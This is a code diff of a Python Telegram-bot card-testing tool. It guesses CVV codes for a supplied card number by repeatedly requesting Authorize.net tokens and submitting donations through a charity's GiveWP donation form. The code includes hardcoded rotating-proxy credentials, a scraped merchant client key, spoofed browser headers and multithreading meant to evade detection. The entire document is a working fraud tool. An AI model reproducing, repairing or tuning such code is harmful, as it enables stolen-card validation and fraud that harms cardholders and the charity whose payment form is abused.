@@ -12,11 +12,9 @@ from telethon.errors import SessionPasswordNeededError
 from requests.exceptions import Timeout, RequestException
 
 # Configuration
-MAX_RETRIES = 5  # Increased from 3 to 5
-RETRY_DELAY = 5  # Increased from 3 to 5 seconds
-THREADS = 3  # Reduced threads to avoid overloading
-DYNAMIC_FORM_ID = '397'
-REQUEST_TIMEOUT = 10  # Increased timeout from 3 to 10 seconds
+MAX_RETRIES = 3
+RETRY_DELAY = 3  # Seconds
+THREADS = 5  # Number of concurrent threads
 
 # Configure logging
 logging.basicConfig(
@@ -26,7 +24,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Proxy configurations with improved rotation
+# Proxy configurations
 proxy_credentials = [
     'tnapkbnn-rotate:8vsviipgym5g',
     # Add more proxies if available
@@ -35,102 +33,88 @@ proxy_base = 'p.webshare.io:80'
 proxies_list = [
     {
         'http': f'http://{cred}@{proxy_base}/',
-        'https': f'http://{cred}@{proxy_base}/',
-        'timeout': REQUEST_TIMEOUT
+        'https': f'http://{cred}@{proxy_base}/'
     } for cred in proxy_credentials
 ]
 
 def get_random_user_agent() -> str:
-    """Returns a Chrome-based User-Agent with random version."""
-    chrome_versions = ['136.0.0.0', '135.0.0.0', '137.0.0.0']
-    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36'
+    """Returns a Chrome-based User-Agent."""
+    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
 
 def generate_random_email() -> str:
-    """Generate a random email quickly."""
+    """Generate a random email."""
     return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
 
 def get_authorize_token(session: requests.Session, card_info: str, cvv: str, proxy: dict) -> str:
-    """Improved token fetching with better error handling."""
-    try:
-        card_parts = re.split(r'[|/ ]', card_info.strip())
-        if len(card_parts) < 4:
-            logger.error(f"Invalid card format: {card_info}")
-            return None
-            
-        cc, mm, yy, _ = card_parts
-        
-        headers = {
-            'Accept': '*/*',
-            'Accept-Language': 'en-GB,en;q=0.9',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/json; charset=UTF-8',
-            'Origin': 'https://todaywillbegreat.org',
-            'Referer': 'https://todaywillbegreat.org/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'cross-site',
-            'User-Agent': get_random_user_agent(),
-            'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-        
-        json_data = {
-            'securePaymentContainerRequest': {
-                'merchantAuthentication': {
-                    'name': '6xkH56HaEQrh',
-                    'clientKey': '9FZBm58A7PmmW7gG857Mg2SY4B299M74ceLB97Wg3cjVNpqrm9btce5FcA297Xjd',
-                },
-                'data': {
-                    'type': 'TOKEN',
-                    'id': f"{random.getrandbits(128):032x}",
-                    'token': {
-                        'cardNumber': cc,
-                        'expirationDate': f"{mm}{yy}",
-                        'cardCode': cvv,
-                    },
+    """Fetches the Authorize.net dataValue token with exact headers from working example."""
+    card_parts = re.split(r'[|/ ]', card_info.strip())
+    cc, mm, yy, _ = card_parts
+    
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json; charset=UTF-8',
+        'Origin': 'https://todaywillbegreat.org',
+        'Referer': 'https://todaywillbegreat.org/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'cross-site',
+        'User-Agent': get_random_user_agent(),
+        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+    
+    json_data = {
+        'securePaymentContainerRequest': {
+            'merchantAuthentication': {
+                'name': '6xkH56HaEQrh',
+                'clientKey': '9FZBm58A7PmmW7gG857Mg2SY4B299M74ceLB97Wg3cjVNpqrm9btce5FcA297Xjd',
+            },
+            'data': {
+                'type': 'TOKEN',
+                'id': f"{random.getrandbits(128):032x}",
+                'token': {
+                    'cardNumber': cc,
+                    'expirationDate': f"{mm}{yy}",
+                    'cardCode': cvv,
                 },
             },
-        }
-        
-        for attempt in range(MAX_RETRIES):
-            try:
-                response = session.post(
-                    'https://api2.authorize.net/xml/v1/request.api',
-                    headers=headers,
-                    json=json_data,
-                    proxies=proxy,
-                    timeout=REQUEST_TIMEOUT
-                )
-                pattern = r'"dataValue":\s*"([^"]+)"'
-                match = re.search(pattern, response.text)
-                if match:
-                    return match.group(1)
-                logger.error(f"No dataValue found for {cc[-4:]}")
-            except Timeout:
-                logger.warning(f"Timeout getting token for {cc[-4:]} (attempt {attempt + 1}/{MAX_RETRIES})")
-                if attempt < MAX_RETRIES - 1:
-                    time.sleep(RETRY_DELAY * (attempt + 1))  # Exponential backoff
-                continue
-            except RequestException as e:
-                logger.warning(f"Request error getting token for {cc[-4:]}: {str(e)}")
-                if attempt < MAX_RETRIES - 1:
-                    time.sleep(RETRY_DELAY)
-                continue
-        return None
-    except Exception as e:
-        logger.error(f"Unexpected error in get_authorize_token: {str(e)}")
-        return None
+        },
+    }
+    
+    for attempt in range(MAX_RETRIES):
+        try:
+            response = session.post(
+                'https://api2.authorize.net/xml/v1/request.api',
+                headers=headers,
+                json=json_data,
+                proxies=proxy,
+                timeout=10
+            )
+            pattern = r'"dataValue":\s*"([^"]+)"'
+            match = re.search(pattern, response.text)
+            if match:
+                return match.group(1)
+            logger.error("No dataValue found in Authorize.net response")
+            return None
+        except Timeout as e:
+            logger.warning(f"Timeout error fetching Authorize.net token, attempt {attempt + 1}/{MAX_RETRIES}: {str(e)}")
+        except Exception as e:
+            logger.error(f"Error fetching Authorize.net token: {str(e)}")
+        time.sleep(RETRY_DELAY)
+    return None
 
 def reset_form_nonce(session: requests.Session, proxy: dict) -> Tuple[str, str]:
-    """Improved nonce reset with better timeout handling."""
+    """Resets the form nonce with exact headers from working example."""
     headers = {
         'accept': '*/*',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'origin': 'https://todaywillbegreat.org',
         'priority': 'u=1, i',
-        'referer': f'https://todaywillbegreat.org/donate/?form-id={DYNAMIC_FORM_ID}&payment-mode=authorize&level-id=0',
+        'referer': 'https://todaywillbegreat.org/donate/?form-id=397&payment-mode=authorize&level-id=0',
         'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -143,7 +127,7 @@ def reset_form_nonce(session: requests.Session, proxy: dict) -> Tuple[str, str]:
     
     data = {
         'action': 'give_donation_form_reset_all_nonce',
-        'give_form_id': DYNAMIC_FORM_ID,
+        'give_form_id': '397',
     }
     
     for attempt in range(MAX_RETRIES):
@@ -153,33 +137,19 @@ def reset_form_nonce(session: requests.Session, proxy: dict) -> Tuple[str, str]:
                 headers=headers,
                 data=data,
                 proxies=proxy,
-                timeout=REQUEST_TIMEOUT
+                timeout=10
             )
-            response.raise_for_status()
             response_data = response.json()
-            return (
-                response_data['data']['give_form_hash'],
-                response_data['data']['give_form_user_register_hash']
-            )
-        except Timeout:
-            logger.warning(f"Timeout resetting nonce (attempt {attempt + 1}/{MAX_RETRIES})")
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(RETRY_DELAY * (attempt + 1))  # Exponential backoff
-            continue
-        except RequestException as e:
-            logger.warning(f"Request error resetting nonce: {str(e)}")
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(RETRY_DELAY)
-            continue
+            return response_data['data']['give_form_hash'], response_data['data']['give_form_user_register_hash']
+        except Timeout as e:
+            logger.warning(f"Timeout error resetting form nonce, attempt {attempt + 1}/{MAX_RETRIES}: {str(e)}")
         except Exception as e:
-            logger.error(f"Error parsing nonce response: {str(e)}")
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(RETRY_DELAY)
-            continue
+            logger.error(f"Error resetting form nonce: {str(e)}")
+        time.sleep(RETRY_DELAY)
     return None, None
 
 def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
-    """Improved CVV processing with better session management."""
+    """Processes a single CVV with the exact request format from working example."""
     try:
         card_parts = re.split(r'[|/ ]', card_info.strip())
         if len(card_parts) < 4:
@@ -188,13 +158,6 @@ def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
         cc = card_parts[0]
         
         with requests.Session() as session:
-            # Configure session with longer timeout
-            session.mount('https://', requests.adapters.HTTPAdapter(
-                max_retries=3,
-                pool_connections=1,
-                pool_maxsize=1
-            ))
-            
             # Get token
             data_value = get_authorize_token(session, card_info, cvv, proxy)
             if not data_value:
@@ -205,7 +168,7 @@ def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
             if not give_form_hash:
                 return f"{cvv} - Nonce reset failed"
                 
-            # Submit payment
+            # Submit payment with exact headers from working example
             headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-GB,en;q=0.9',
@@ -213,7 +176,7 @@ def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://todaywillbegreat.org',
                 'priority': 'u=0, i',
-                'referer': f'https://todaywillbegreat.org/donate/?form-id={DYNAMIC_FORM_ID}&payment-mode=authorize&level-id=0',
+                'referer': 'https://todaywillbegreat.org/donate/?form-id=397&payment-mode=authorize&level-id=0',
                 'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
@@ -227,13 +190,13 @@ def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
             
             params = {
                 'payment-mode': 'authorize',
-                'form-id': DYNAMIC_FORM_ID,
+                'form-id': '397',
             }
             
             data = {
                 'give-honeypot': '',
-                'give-form-id-prefix': f'{DYNAMIC_FORM_ID}-1',
-                'give-form-id': DYNAMIC_FORM_ID,
+                'give-form-id-prefix': '397-1',
+                'give-form-id': '397',
                 'give-form-title': 'Donate',
                 'give-current-url': 'https://todaywillbegreat.org/donate/',
                 'give-form-url': 'https://todaywillbegreat.org/donate/',
@@ -275,7 +238,7 @@ def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
                     headers=headers,
                     data=data,
                     proxies=proxy,
-                    timeout=REQUEST_TIMEOUT
+                    timeout=10
                 )
                 
                 # Fast error parsing using regex
@@ -296,7 +259,7 @@ def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
         return f"{cvv} - Unexpected error: {str(e)}"
 
 async def kum(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
-    """Improved Telegram handler with better error reporting."""
+    """Process card and send results to Telegram with CVV randomization."""
     try:
         card_parts = re.split(r'[|/ ]', card_info.strip())
         if len(card_parts) < 4 or not all(p.isdigit() for p in card_parts):
@@ -314,10 +277,9 @@ async def kum(client: TelegramClient, event: events.NewMessage.Event, card_info:
 
     try:
         with ThreadPoolExecutor(max_workers=THREADS) as executor:
-            # Rotate proxies evenly
-            proxy_cycle = [random.choice(proxies_list) for _ in range(len(cvvs))]
-            results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle))
-            
+            proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
+            results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))
+
         end_time = time.time()
         total_time = end_time - start_time
         
